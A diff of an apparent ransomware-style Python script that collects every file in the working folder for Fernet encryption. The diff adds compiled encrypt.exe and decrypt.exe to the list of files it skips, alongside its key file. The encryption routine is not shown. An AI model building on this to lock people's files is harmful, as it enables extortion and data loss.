@@ -2,8 +2,9 @@ import os, ctypes, base64
 from cryptography.fernet import Fernet
 
 files = []  # array for all files in folder
+no_encrypt = ["encrypt.py", "decrypt.py", "key.key", "encrypt.exe", "decrypt.exe"]
 for file in os.listdir():  # Scan files in current folder
-    if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":  # skip these files
+    if file in no_encrypt:  # skip these files
         continue
     if os.path.isfile(file):  # if file add to array
         files.append(file)
